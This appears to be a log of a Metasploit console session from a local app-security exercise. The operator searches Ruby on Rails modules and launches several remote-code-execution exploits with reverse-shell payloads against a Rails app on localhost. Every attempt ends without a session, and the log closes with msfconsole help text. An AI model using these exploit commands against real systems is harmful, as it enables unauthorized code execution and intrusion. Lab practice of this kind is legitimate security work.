# Docker Metasploit commands and outputs

msf6 > search "Ruby on Rails"

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank       Check  Description
   -   ----                                                  ---------------  ----       -----  -----------
   0   exploit/multi/http/metasploit_static_secret_key_base  2016-09-15       excellent  Yes    Metasploit Web UI Static secret_key_base Value
   1   auxiliary/scanner/http/rails_mass_assignment          .                normal     No     Ruby On Rails Attributes Mass Assignment Scanner
   2   exploit/multi/http/rails_double_tap                   2019-03-13       excellent  Yes    Ruby On Rails DoubleTap Development Mode secret_key_base Vulnerability
   3   auxiliary/gather/rails_doubletap_file_read            .                normal     Yes    Ruby On Rails File Content Disclosure ('doubletap')
   4   auxiliary/dos/http/rails_action_view                  2013-12-04       normal     No     Ruby on Rails Action View MIME Memory Exhaustion
   5   exploit/multi/http/rails_actionpack_inline_exec       2016-03-01       excellent  No     Ruby on Rails ActionPack Inline ERB Code Execution
   6   auxiliary/admin/http/rails_devise_pass_reset          2013-01-28       normal     No     Ruby on Rails Devise Authentication Password Reset
   7   exploit/multi/http/rails_dynamic_render_code_exec     2016-10-16       excellent  Yes    Ruby on Rails Dynamic Render File Upload Remote Code Execution
   8   auxiliary/dos/http/rails_json_float_dos               2013-11-22       normal     No     Ruby on Rails JSON Processor Floating Point Heap Overflow DoS
   9   exploit/multi/http/rails_json_yaml_code_exec          2013-01-28       excellent  No     Ruby on Rails JSON Processor YAML Deserialization Code Execution
   10  auxiliary/scanner/http/rails_json_yaml_scanner        .                normal     No     Ruby on Rails JSON Processor YAML Deserialization Scanner
   11  exploit/multi/http/rails_secret_deserialization       2013-04-11       excellent  No     Ruby on Rails Known Secret Session Cookie Remote Code Execution
   12  exploit/multi/http/rails_web_console_v2_code_exec     2015-06-16       excellent  No     Ruby on Rails Web Console (v2) Whitelist Bypass Code Execution
   13  exploit/multi/http/rails_xml_yaml_code_exec           2013-01-07       excellent  No     Ruby on Rails XML Processor YAML Deserialization Code Execution
   14  auxiliary/scanner/http/rails_xml_yaml_scanner         .                normal     No     Ruby on Rails XML Processor YAML Deserialization Scanner


Interact with a module by name or index. For example info 14, use 14 or use auxiliary/scanner/http/rails_xml_yaml_scanner

msf6 > info 0

       Name: Metasploit Web UI Static secret_key_base Value
     Module: exploit/multi/http/metasploit_static_secret_key_base
   Platform: Ruby
       Arch: ruby
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2016-09-15

Provided by:
  Justin Steven
  joernchen of Phenoelit <joernchen@phenoelit.de>

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT      3790             yes       The target port (TCP)
  SSL        true             no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The path to the Metasploit Web UI
  VHOST                       no        HTTP server virtual host

Payload information:

Description:
  This module exploits the Web UI for Metasploit Community, Express and
  Pro where one of a certain set of Weekly Releases have been applied.
  These Weekly Releases introduced a static secret_key_base value.
  Knowledge of the static secret_key_base value allows for
  deserialization of a crafted Ruby Object, achieving code execution.

  This module is based on
  exploits/multi/http/rails_secret_deserialization

References:
  OVE (20160904-0002)
  https://www.rapid7.com/blog/post/2016/09/15/important-security-fixes-in-metasploit-4120-2016091401
  https://github.com/justinsteven/advisories/blob/master/2016_metasploit_rce_static_key_deserialization.md


View the full module info with the info -d command.

msf6 > search "Ruby on Rails"

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank       Check  Description
   -   ----                                                  ---------------  ----       -----  -----------
   0   exploit/multi/http/metasploit_static_secret_key_base  2016-09-15       excellent  Yes    Metasploit Web UI Static secret_key_base Value
   1   auxiliary/scanner/http/rails_mass_assignment          .                normal     No     Ruby On Rails Attributes Mass Assignment Scanner
   2   exploit/multi/http/rails_double_tap                   2019-03-13       excellent  Yes    Ruby On Rails DoubleTap Development Mode secret_key_base Vulnerability
   3   auxiliary/gather/rails_doubletap_file_read            .                normal     Yes    Ruby On Rails File Content Disclosure ('doubletap')
   4   auxiliary/dos/http/rails_action_view                  2013-12-04       normal     No     Ruby on Rails Action View MIME Memory Exhaustion
   5   exploit/multi/http/rails_actionpack_inline_exec       2016-03-01       excellent  No     Ruby on Rails ActionPack Inline ERB Code Execution
   6   auxiliary/admin/http/rails_devise_pass_reset          2013-01-28       normal     No     Ruby on Rails Devise Authentication Password Reset
   7   exploit/multi/http/rails_dynamic_render_code_exec     2016-10-16       excellent  Yes    Ruby on Rails Dynamic Render File Upload Remote Code Execution
   8   auxiliary/dos/http/rails_json_float_dos               2013-11-22       normal     No     Ruby on Rails JSON Processor Floating Point Heap Overflow DoS
   9   exploit/multi/http/rails_json_yaml_code_exec          2013-01-28       excellent  No     Ruby on Rails JSON Processor YAML Deserialization Code Execution
   10  auxiliary/scanner/http/rails_json_yaml_scanner        .                normal     No     Ruby on Rails JSON Processor YAML Deserialization Scanner
   11  exploit/multi/http/rails_secret_deserialization       2013-04-11       excellent  No     Ruby on Rails Known Secret Session Cookie Remote Code Execution
   12  exploit/multi/http/rails_web_console_v2_code_exec     2015-06-16       excellent  No     Ruby on Rails Web Console (v2) Whitelist Bypass Code Execution
   13  exploit/multi/http/rails_xml_yaml_code_exec           2013-01-07       excellent  No     Ruby on Rails XML Processor YAML Deserialization Code Execution
   14  auxiliary/scanner/http/rails_xml_yaml_scanner         .                normal     No     Ruby on Rails XML Processor YAML Deserialization Scanner


Interact with a module by name or index. For example info 14, use 14 or use auxiliary/scanner/http/rails_xml_yaml_scanner

msf6 > use 2
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/http/rails_double_tap) > set RHOSTS http://127.0.0.1:3000
RHOSTS => http://127.0.0.1:3000
msf6 exploit(multi/http/rails_double_tap) > set RPORT 3000
RPORT => 3000
msf6 exploit(multi/http/rails_double_tap) > exploit

[!] You are binding to a loopback address by setting LHOST to 127.0.1.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.1.1:4444 
[*] Attempting to retrieve the application name...
[-] Exploit aborted due to failure: unknown: No response from the server
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/rails_double_tap) > exploit

[!] You are binding to a loopback address by setting LHOST to 127.0.1.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.1.1:4444 
[*] Attempting to retrieve the application name...
[*] The application name is: app-sec-exercise
[*] Stager ready: 433 bytes
[*] Sending serialized payload to target (1250 bytes)
[-] It doesn't look like the exploit worked. Server returned: 404.
[-] The expected response should be HTTP 200.
[!] This exploit may require manual cleanup of '/tmp/egkAoh.bin' on the target
[!] This exploit may require manual cleanup of '/tmp/BWqSo.bin' on the target
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/rails_double_tap) > use 5
[*] No payload configured, defaulting to generic/shell_reverse_tcp
msf6 exploit(multi/http/rails_actionpack_inline_exec) > exploit

[-] Msf::OptionValidateError One or more options failed to validate: RHOSTS.
msf6 exploit(multi/http/rails_actionpack_inline_exec) > GET RHOSTS
[-] Unknown command: GET. Did you mean get? Run the help command for more details.
msf6 exploit(multi/http/rails_actionpack_inline_exec) > SET RHOSTS http://127.0.0.1:3000
[-] Unknown command: SET. Did you mean set? Run the help command for more details.
msf6 exploit(multi/http/rails_actionpack_inline_exec) > set RHOSTS http://127.0.0.1:3000
RHOSTS => http://127.0.0.1:3000
msf6 exploit(multi/http/rails_actionpack_inline_exec) > set RPORT 3000
RPORT => 3000
msf6 exploit(multi/http/rails_actionpack_inline_exec) > exploit

[!] You are binding to a loopback address by setting LHOST to 127.0.1.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.1.1:4444 
[*] Sending inline code to parameter: id
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/rails_actionpack_inline_exec) > use 7
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/http/rails_dynamic_render_code_exec) > set RHOSTS http://127.0.0.1:3000
RHOSTS => http://127.0.0.1:3000
msf6 exploit(multi/http/rails_dynamic_render_code_exec) > set RPORT 3000
RPORT => 3000
msf6 exploit(multi/http/rails_dynamic_render_code_exec) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[!] You are binding to a loopback address by setting LHOST to 127.0.1.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.1.1:4444 
[*] Sending initial request to detect exploitability
[*] 127.0.0.1:3000 - Starting up our web service on http://127.0.0.1:1337/DYpIVjivYyniGtq ...
[*] Using URL: http://127.0.1.1:1337/DYpIVjivYyniGtq
[*] uploading image...
msf6 exploit(multi/http/rails_dynamic_render_code_exec) > [*] Server stopped.
[!] This exploit may require manual cleanup of '/tmp/OQFAFXwRg' on the target
Interrupt: use the 'exit' command to quit
msf6 exploit(multi/http/rails_dynamic_render_code_exec) > exploit
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[!] You are binding to a loopback address by setting LHOST to 127.0.1.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.1.1:4444 
[*] Sending initial request to detect exploitability
msf6 exploit(multi/http/rails_dynamic_render_code_exec) > [*] 127.0.0.1:3000 - Starting up our web service on http://127.0.0.1:1337/rhOTvLWTVHI ...
[*] Using URL: http://127.0.1.1:1337/rhOTvLWTVHI
[*] uploading image...
[*] Server stopped.
[!] This exploit may require manual cleanup of '/tmp/QOwzAJwrkMc' on the target
Interrupt: use the 'exit' command to quit
msf6 exploit(multi/http/rails_dynamic_render_code_exec) > use 9
[*] No payload configured, defaulting to generic/shell_reverse_tcp
msf6 exploit(multi/http/rails_json_yaml_code_exec) > set RHOSTS http://127.0.0.1:3000
RHOSTS => http://127.0.0.1:3000
msf6 exploit(multi/http/rails_json_yaml_code_exec) > set RHOSTS http://127.0.0.1:3000
RHOSTS => http://127.0.0.1:3000
msf6 exploit(multi/http/rails_json_yaml_code_exec) > exploit

[!] You are binding to a loopback address by setting LHOST to 127.0.1.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.1.1:4444 
[*] Sending Railsv2 request to 127.0.0.1:3000...
[*] Sending Railsv3 request to 127.0.0.1:3000...
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/rails_json_yaml_code_exec) > use 11
[*] No payload configured, defaulting to generic/shell_reverse_tcp
msf6 exploit(multi/http/rails_secret_deserialization) > set RHOSTS http://127.0.0.1:3000
RHOSTS => http://127.0.0.1:3000
msf6 exploit(multi/http/rails_secret_deserialization) > 
msf6 exploit(multi/http/rails_secret_deserialization) > set RPORT 3000
RPORT => 3000
msf6 exploit(multi/http/rails_secret_deserialization) > 
msf6 exploit(multi/http/rails_secret_deserialization) > exploit

[-] Msf::OptionValidateError One or more options failed to validate: SECRET.
msf6 exploit(multi/http/rails_secret_deserialization) > info 11

       Name: Ruby on Rails Known Secret Session Cookie Remote Code Execution
     Module: exploit/multi/http/rails_secret_deserialization
   Platform: Ruby
       Arch: ruby
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2013-04-11

Provided by:
  joernchen of Phenoelit <joernchen@phenoelit.de>

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic

Check supported:
  No

Basic options:
  Name             Current Setting          Required  Description
  ----             ---------------          --------  -----------
  COOKIE_NAME                               no        The name of the session cookie
  DIGEST_NAME      SHA1                     yes       The digest type used to HMAC the session cookie
  HTTP_METHOD      GET                      yes       The HTTP request method (GET, POST, PUT typically work)
  Proxies                                   no        A proxy chain of format type:host:port[,type:host:port][...]
  RAILSVERSION     3                        yes       The target Rails Version (use 3 for Rails3 and 2, 4 for Rails4)
  RHOSTS                                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT            80                       yes       The target port (TCP)
  SALTENC          encrypted cookie         yes       The encrypted cookie salt
  SALTSIG          signed encrypted cookie  yes       The signed encrypted cookie salt
  SECRET                                    yes       The secret_token (Rails3) or secret_key_base (Rails4) of the application (needed to sign the cookie)
  SSL              false                    no        Negotiate SSL/TLS for outgoing connections
  TARGETURI        /                        yes       The path to a vulnerable Ruby on Rails application
  VALIDATE_COOKIE  true                     no        Only send the payload if the session cookie is validated
  VHOST                                     no        HTTP server virtual host

Payload information:

Description:
  This module implements Remote Command Execution on Ruby on Rails applications.
  Prerequisite is knowledge of the "secret_token" (Rails 2/3) or "secret_key_base"
  (Rails 4). The values for those can be usually found in the file
  "RAILS_ROOT/config/initializers/secret_token.rb". The module achieves RCE by
  deserialization of a crafted Ruby Object.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2013-0156
  http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/


View the full module info with the info -d command.

msf6 exploit(multi/http/rails_secret_deserialization) > use 12
[*] No payload configured, defaulting to generic/shell_reverse_tcp
msf6 exploit(multi/http/rails_web_console_v2_code_exec) > info 12

       Name: Ruby on Rails Web Console (v2) Whitelist Bypass Code Execution
     Module: exploit/multi/http/rails_web_console_v2_code_exec
   Platform: Ruby
       Arch: ruby
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2015-06-16

Provided by:
  joernchen <joernchen@phenoelit.de>
  Ben Murphy <benmmurphy@gmail.com>
  hdm <x@hdm.io>

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic

Check supported:
  No

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT      3000             yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /missing404      yes       The path to a vulnerable Ruby on Rails application
  VHOST                       no        HTTP server virtual host

Payload information:

Description:
  This module exploits an IP whitelist bypass vulnerability in the developer
  web console included with Ruby on Rails 4.0.x and 4.1.x. This module will also
  achieve code execution on Rails 4.2.x if the attack is launched from a
  whitelisted IP range.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2015-3224
  http://openwall.com/lists/oss-security/2015/06/16/18
  https://groups.google.com/forum/message/raw?msg=rubyonrails-security/lzmz9_ijUFw/HBMPi4zp5NAJ
  https://hackerone.com/reports/44513


View the full module info with the info -d command.

msf6 exploit(multi/http/rails_web_console_v2_code_exec) > set TARGETURI /
TARGETURI => /
msf6 exploit(multi/http/rails_web_console_v2_code_exec) > set RHOSTS http://127.0.0.1:3000
RHOSTS => http://127.0.0.1:3000
msf6 exploit(multi/http/rails_web_console_v2_code_exec) > set RPORT 3000
RPORT => 3000
msf6 exploit(multi/http/rails_web_console_v2_code_exec) > 
msf6 exploit(multi/http/rails_web_console_v2_code_exec) > exploit

[!] You are binding to a loopback address by setting LHOST to 127.0.1.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.1.1:4444 
[-] Error: No web console path found when requesting /
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/rails_web_console_v2_code_exec) > set TARGETURI /admin/login
TARGETURI => /admin/login
msf6 exploit(multi/http/rails_web_console_v2_code_exec) > exploit

[!] You are binding to a loopback address by setting LHOST to 127.0.1.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.1.1:4444 
[-] Error: No web console path found when requesting /admin/login
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/rails_web_console_v2_code_exec) > use 13
[*] No payload configured, defaulting to generic/shell_reverse_tcp
msf6 exploit(multi/http/rails_xml_yaml_code_exec) > info 13

       Name: Ruby on Rails XML Processor YAML Deserialization Code Execution
     Module: exploit/multi/http/rails_xml_yaml_code_exec
   Platform: Ruby
       Arch: ruby
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2013-01-07

Provided by:
  charliesome
  espes
  lian
  hdm <x@hdm.io>

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic

Check supported:
  No

Basic options:
  Name         Current Setting  Required  Description
  ----         ---------------  --------  -----------
  HTTP_METHOD  POST             yes       HTTP Method (Accepted: GET, POST, PUT)
  Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT        80               yes       The target port (TCP)
  SSL          false            no        Negotiate SSL/TLS for outgoing connections
  URIPATH      /                yes       The path to a vulnerable Ruby on Rails application
  VHOST                         no        HTTP server virtual host

Payload information:

Description:
  This module exploits a remote code execution vulnerability in the XML request
  processor of the Ruby on Rails application framework. This vulnerability allows
  an attacker to instantiate a remote object, which in turn can be used to execute
  any ruby code remotely in the context of the application.

  This module has been tested across multiple versions of RoR 3.x and RoR 2.x

  The technique used by this module requires the target to be running a fairly recent
  version of Ruby 1.9 (since 2011 or so). Applications using Ruby 1.8 may still be
  exploitable using the init_with() method, but this has not been demonstrated.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2013-0156
  OSVDB (89026)
  https://www.rapid7.com/blog/post/2013/01/09/serialization-mischief-in-ruby-land-cve-2013-0156


View the full module info with the info -d command.

msf6 exploit(multi/http/rails_xml_yaml_code_exec) > set URIPATH /
URIPATH => /
msf6 exploit(multi/http/rails_xml_yaml_code_exec) > set RHOSTS http://127.0.0.1:3000
RHOSTS => http://127.0.0.1:3000
msf6 exploit(multi/http/rails_xml_yaml_code_exec) > 
msf6 exploit(multi/http/rails_xml_yaml_code_exec) > set RPORT 3000
RPORT => 3000
msf6 exploit(multi/http/rails_xml_yaml_code_exec) > 
msf6 exploit(multi/http/rails_xml_yaml_code_exec) > set HTTP_METHOD GET
HTTP_METHOD => GET
msf6 exploit(multi/http/rails_xml_yaml_code_exec) > exploit

[!] You are binding to a loopback address by setting LHOST to 127.0.1.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.1.1:4444 
[*] Sending Railsv2 request to 127.0.0.1:3000...
[*] Sending Railsv3 request to 127.0.0.1:3000...
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/rails_xml_yaml_code_exec) > set HTTP_METHOD POST
HTTP_METHOD => POST
msf6 exploit(multi/http/rails_xml_yaml_code_exec) > exploit

[!] You are binding to a loopback address by setting LHOST to 127.0.1.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.1.1:4444 
[*] Sending Railsv2 request to 127.0.0.1:3000...
[*] Sending Railsv3 request to 127.0.0.1:3000...
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/rails_xml_yaml_code_exec) > set HTTP_METHOD PUT
HTTP_METHOD => PUT
msf6 exploit(multi/http/rails_xml_yaml_code_exec) > exploit

[!] You are binding to a loopback address by setting LHOST to 127.0.1.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.1.1:4444 
[*] Sending Railsv2 request to 127.0.0.1:3000...
[*] Sending Railsv3 request to 127.0.0.1:3000...
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/rails_xml_yaml_code_exec) > payload
[-] Unknown command: payload. Run the help command for more details.
msf6 exploit(multi/http/rails_xml_yaml_code_exec) > help payload
[-] No such command
msf6 exploit(multi/http/rails_xml_yaml_code_exec) > help

Core Commands
=============

    Command           Description
    -------           -----------
    ?                 Help menu
    banner            Display an awesome metasploit banner
    cd                Change the current working directory
    color             Toggle color
    connect           Communicate with a host
    debug             Display information useful for debugging
    exit              Exit the console
    features          Display the list of not yet released features that can be opted in to
    get               Gets the value of a context-specific variable
    getg              Gets the value of a global variable
    grep              Grep the output of another command
    help              Help menu
    history           Show command history
    load              Load a framework plugin
    quit              Exit the console
    repeat            Repeat a list of commands
    route             Route traffic through a session
    save              Saves the active datastores
    sessions          Dump session listings and display information about sessions
    set               Sets a context-specific variable to a value
    setg              Sets a global variable to a value
    sleep             Do nothing for the specified number of seconds
    spool             Write console output into a file as well the screen
    threads           View and manipulate background threads
    tips              Show a list of useful productivity tips
    unload            Unload a framework plugin
    unset             Unsets one or more context-specific variables
    unsetg            Unsets one or more global variables
    version           Show the framework and console library version numbers


Module Commands
===============

    Command           Description
    -------           -----------
    advanced          Displays advanced options for one or more modules
    back              Move back from the current context
    clearm            Clear the module stack
    favorite          Add module(s) to the list of favorite modules
    favorites         Print the list of favorite modules (alias for `show favorites`)
    info              Displays information about one or more modules
    listm             List the module stack
    loadpath          Searches for and loads modules from a path
    options           Displays global options or for one or more modules
    popm              Pops the latest module off the stack and makes it active
    previous          Sets the previously loaded module as the current module
    pushm             Pushes the active or list of modules onto the module stack
    reload_all        Reloads all modules from all defined module paths
    search            Searches module names and descriptions
    show              Displays modules of a given type, or all modules
    use               Interact with a module by name or search term/index


Job Commands
============

    Command           Description
    -------           -----------
    handler           Start a payload handler as job
    jobs              Displays and manages jobs
    kill              Kill a job
    rename_job        Rename a job


Resource Script Commands
========================

    Command           Description
    -------           -----------
    makerc            Save commands entered since start to a file
    resource          Run the commands stored in a file


Database Backend Commands
=========================

    Command           Description
    -------           -----------
    analyze           Analyze database information about a specific address or address range
    db_connect        Connect to an existing data service
    db_disconnect     Disconnect from the current data service
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
    db_remove         Remove the saved data service entry
    db_save           Save the current data service connection as the default to reconnect on startup
    db_stats          Show statistics for the database
    db_status         Show the current data service status
    hosts             List all hosts in the database
    klist             List Kerberos tickets in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces


Credentials Backend Commands
============================

    Command           Description
    -------           -----------
    creds             List all credentials in the database


Developer Commands
==================

    Command           Description
    -------           -----------
    edit              Edit the current module or a file with the preferred editor
    irb               Open an interactive Ruby shell in the current context
    log               Display framework.log paged to the end if possible
    pry               Open the Pry debugger on the current module or Framework
    reload_lib        Reload Ruby library files from specified paths
    time              Time how long it takes to run a particular command


DNS Commands
============

    Command           Description
    -------           -----------
    dns               Manage Metasploit's DNS resolving behaviour


Exploit Commands
================

    Command           Description
    -------           -----------
    check             Check to see if a target is vulnerable
    exploit           Launch an exploit attempt
    rcheck            Reloads the module and checks if the target is vulnerable
    recheck           Alias for rcheck
    reload            Just reloads the module
    rerun             Alias for rexploit
    rexploit          Reloads the module and launches an exploit attempt
    run               Alias for exploit

For more info on a specific command, use <command> -h or help <command>.


msfconsole
==========

`msfconsole` is the primary interface to Metasploit Framework. There is quite a
lot that needs go here, please be patient and keep an eye on this space!

Building ranges and lists
-------------------------

Many commands and options that take a list of things can use ranges to avoid
having to manually list each desired thing. All ranges are inclusive.

### Ranges of IDs

Commands that take a list of IDs can use ranges to help. Individual IDs must be
separated by a `,` (no space allowed) and ranges can be expressed with either
`-` or `..`.

### Ranges of IPs

There are several ways to specify ranges of IP addresses that can be mixed
together. The first way is a list of IPs separated by just a ` ` (ASCII space),
with an optional `,`. The next way is two complete IP addresses in the form of
`BEGINNING_ADDRESS-END_ADDRESS` like `127.0.1.44-127.0.2.33`. CIDR
specifications may also be used, however the whole address must be given to
Metasploit like `127.0.0.0/8` and not `127/8`, contrary to the RFC.
Additionally, a netmask can be used in conjunction with a domain name to
dynamically resolve which block to target. All these methods work for both IPv4
and IPv6 addresses. IPv4 addresses can also be specified with special octet
ranges from the [NMAP target
specification](https://nmap.org/book/man-target-specification.html)

### Examples

Terminate the first sessions:

    sessions -k 1

Stop some extra running jobs:

    jobs -k 2-6,7,8,11..15

Check a set of IP addresses:

    check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255

Target a set of IPv6 hosts:

    set RHOSTS fe80::3990:0000/110, ::1-::f0f0

Target a block from a resolved domain name:

    set RHOSTS www.example.test/24

